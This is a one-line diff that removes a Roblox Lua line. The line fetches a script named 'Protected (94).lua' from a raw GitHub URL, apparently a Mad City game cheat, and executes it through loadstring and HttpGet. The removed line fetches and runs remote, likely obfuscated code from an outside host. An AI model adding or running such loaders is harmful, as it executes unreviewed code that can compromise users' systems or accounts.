@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/III-MAD-CITY/main/Protected%20(94).lua"))()
